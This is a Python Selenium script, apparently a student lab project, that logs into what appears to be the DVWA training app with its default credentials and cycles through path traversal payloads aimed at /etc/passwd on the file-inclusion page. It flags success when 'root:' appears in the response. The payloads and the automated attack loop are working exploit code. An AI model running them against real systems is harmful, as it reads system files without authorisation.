from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

# Đường dẫn tới ChromeDriver
driver_path = 'C:/Final Project/driver/chromedriver.exe'
base_url = 'http://172.30.216.111:8000/vulnerabilities/fi/?page='
login_url = 'http://172.30.216.111:8000/login.php'

# Các payload để kiểm tra lỗ hổng path traversal
payloads = [
    'etc/passwd',
    '../etc/passwd',
    '../../etc/passwd',
    '../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../../../etc/passwd',
    '../../../../../../etc/passwd',
    '../../../../../../../etc/passwd',
    '../../../../../../../../etc/passwd',
    '../../../../../../../../../etc/passwd'
]

# Khởi tạo dịch vụ ChromeDriver
service = Service(driver_path)
options = webdriver.ChromeOptions()
#options.add_argument("--headless")  # Chạy Chrome ở chế độ headless (tùy chọn)

# Khởi tạo trình duyệt với dịch vụ và tùy chọn
driver = webdriver.Chrome(service=service)

driver.get(login_url)
time.sleep(2)  # Đợi trang tải hoàn toàn

# Nhập thông tin đăng nhập
username_xpath = "/html/body/div[@id='wrapper']/div[@id='content']/form/fieldset/input[@class='loginInput'][1]"
password_xpath = "/html/body/div[@id='wrapper']/div[@id='content']/form/fieldset/input[@class='loginInput'][2]"
submit_xpath = "/html/body/div[@id='wrapper']/div[@id='content']/form/fieldset/p[@class='submit']/input"

# Tìm và nhập username
username_element = driver.find_element(By.XPATH, username_xpath)
username_element.send_keys("admin")

# Tìm và nhập password
password_element = driver.find_element(By.XPATH, password_xpath)
password_element.send_keys("password")

# Nhấn nút submit
submit_button = driver.find_element(By.XPATH, submit_xpath)
submit_button.click()

# Đợi một chút để xử lý đăng nhập và tải trang mới
time.sleep(3)

# Lấy URL hiện tại sau khi đăng nhập
current_url = driver.current_url
print(f"Current URL after login: {current_url}")


# Hàm kiểm tra path traversal
def test_path_traversal(payload):
    url = f'{base_url}{payload}'
    driver.get(url)
    
    time.sleep(2)  # Đợi trang tải

    # Kiểm tra kết quả
    body_element = driver.find_element(By.XPATH, "/html/body[@class='home']").text  
    
    if 'root:' in body_element:  # Kiểm tra dấu hiệu của tập tin passwd
        print(f'Vulnerable to path traversal with payload: {payload}')
    else:
        print(f'Not vulnerable with payload: {payload}')




# Thực hiện kiểm tra với từng payload
for payload in payloads:
    test_path_traversal(payload)

# Đóng trình duyệt
#driver.quit()
